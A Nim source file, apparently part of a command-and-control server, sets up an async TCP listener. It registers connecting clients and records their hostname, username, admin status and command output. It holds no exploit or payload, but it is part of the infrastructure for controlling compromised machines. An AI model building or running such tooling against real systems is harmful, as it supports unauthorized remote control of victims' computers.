import asyncdispatch, asyncnet, asyncfutures, strutils

import ../types, ../logging

proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: Client) {.async.} =

  while true:
    let line = await tcpSocket.socket.recvLine()
    
    let args = line.split(":")
    let cmd = args[0]
    let argsn = len(args)

    if line.len == 0:
      cDisconnected(client)  
      client.connected = false
      tcpSocket.socket.close()
      return
    
    case cmd:
    of "connect":
      await tcpSocket.socket.send("hi\r\n")
    of "INFO":
      server.clients[client.id].loaded = true
      server.clients[client.id].hostname = args[1]
      server.clients[client.id].username = args[2]
      server.clients[client.id].isAdmin = parseBool(args[3])
    of "OUTPUT":
      logClientOutput client, args[1], args[2]
      if not server.clRespFuture.isNil():
        server.clRespFuture[].complete()
        server.clRespFuture[] = nil

proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.async.} =
  let id = len(server.tcpListeners)
  server.tcpListeners.add(
    TCPListener(
      sockets: @[], 
      port: port,
      listeningIP: ip,
      id: id, 
      socket: newAsyncSocket()
    )
  )
  server.tcpListeners[id].socket.bindAddr(port.Port, ip)
  server.tcpListeners[id].socket.listen()
  
  infoLog "listening on localhost:" & intToStr(port)
  
  while true:
    let (netAddr, clientSocket) = await server.tcpListeners[id].socket.acceptAddr()

    let client = Client(
      listenerType: "tcp",
      id: server.clients.len,
      connected: true,
      loaded: false,
      isAdmin: false,
      hostname: "placeholder",
      username: "placeholder",
      server: server
    )
    let tcpSocket = TCPSocket(
      socket: clientSocket,
      id: client.id,
      netAddr: netAddr
    )

    server.clients.add(client)
    server.tcpListeners[id].sockets.add(tcpSocket)

    cConnected(client)
    asyncCheck processMessages(server, tcpSocket, client)